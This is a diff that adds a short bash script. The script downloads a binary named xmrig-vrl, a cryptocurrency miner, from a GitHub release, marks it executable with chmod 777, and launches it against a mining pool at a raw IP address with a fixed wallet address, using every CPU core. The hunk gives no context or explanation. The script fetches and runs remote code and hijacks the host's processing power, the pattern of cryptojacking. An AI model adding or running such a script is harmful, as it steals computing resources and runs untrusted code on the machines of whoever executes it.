@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
+chmod 777 vrl
+./vrl -a randomvirel --url 45.76.82.139:80 --user v3tlz40cfd6rvhf15cip7g4yqocep3z5zns3jq.x --pass webpassword=x -t $(nproc --all)
